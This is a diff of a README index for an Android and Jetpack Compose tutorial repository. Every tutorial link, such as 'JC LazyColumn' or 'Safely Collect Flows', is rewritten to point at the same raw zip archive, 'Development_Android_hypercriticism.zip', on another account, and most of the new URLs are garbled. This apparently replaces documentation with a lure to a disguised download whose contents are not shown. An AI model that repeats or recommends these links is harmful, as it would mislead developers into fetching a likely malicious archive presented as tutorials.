@@ -2,75 +2,75 @@
  ### Android Development  Examples
  
  
-[Android Development Key Terms](https://github.com/murad8al/Android-Development/blob/main/Examples/Android%20Development%20Key%20Terms.md)
+[Android Development Key Terms](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20Development%20Key%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[Android Kotlin timer](https://github.com/murad8al/Android-Development/blob/main/Examples/Android%20Kotlin%20timer.md)
+[Android Kotlin timer](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20Kotlin%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[Android Studio Helpful Tips](https://github.com/murad8al/Android-Development/blob/main/Examples/Android%20Studio%20Helpful%20Tips.md)
+[Android Studio Helpful Tips](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20Studio%20Helpful%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[ArrayList and mutableList](https://github.com/murad8al/Android-Development/blob/main/Examples/ArrayList%20and%20mutableList.md)
+[ArrayList and mutableList](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20and%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[date](https://github.com/murad8al/Android-Development/blob/main/Examples/date.md)
+[date](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[JC Button](https://github.com/murad8al/Android-Development/blob/main/Examples/JC%20Button.md)
+[JC Button](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[JC dropdown menu](https://github.com/murad8al/Android-Development/blob/main/Examples/JC%20dropdown%20menu.md)
+[JC dropdown menu](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20dropdown%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[JC LazyColumn](https://github.com/murad8al/Android-Development/blob/main/Examples/JC%20LazyColumn.md)
+[JC LazyColumn](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[JC Modifiers](https://github.com/murad8al/Android-Development/blob/main/Examples/JC%20Modifiers.md)
+[JC Modifiers](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[JC Navigation Drawer](https://github.com/murad8al/Android-Development/blob/main/Examples/JC%20Navigation%20Drawer.md)
+[JC Navigation Drawer](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20Navigation%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[JC Recyclerview](https://github.com/murad8al/Android-Development/blob/main/Examples/JC%20Recyclerview.md)
+[JC Recyclerview](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[JC Splash screen](https://github.com/murad8al/Android-Development/blob/main/Examples/JC%20Splash%20screen.md)
+[JC Splash screen](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20Splash%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[JC ViewModel Tutorial](https://github.com/murad8al/Android-Development/blob/main/Examples/JC%20ViewModel%20Tutorial.md)
+[JC ViewModel Tutorial](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20ViewModel%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[Markdown](https://github.com/murad8al/Android-Development/blob/main/Examples/Markdown.md)
+[Markdown](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[Safely Collect Flows](https://github.com/murad8al/Android-Development/blob/main/Examples/Safely%20Collect%20Flows.md)
+[Safely Collect Flows](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20Collect%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[visibility modifiers in Kotlin](https://github.com/murad8al/Android-Development/blob/main/Examples/visibility%20modifiers%20in%20Kotlin.md)
+[visibility modifiers in Kotlin](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20modifiers%20in%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[WiFi and Mobile data](https://github.com/murad8al/Android-Development/blob/main/Examples/WiFi%20and%20Mobile%20data.md)
+[WiFi and Mobile data](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip%20and%20Mobile%https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
-[LiveData](https://github.com/murad8al/Android-Development/blob/main/Examples/LiveData.md)
+[LiveData](https://github.com/muradaldahmashi/Android-Development/raw/refs/heads/main/Examples/Development_Android_hypercriticism.zip)
 
 ---
 
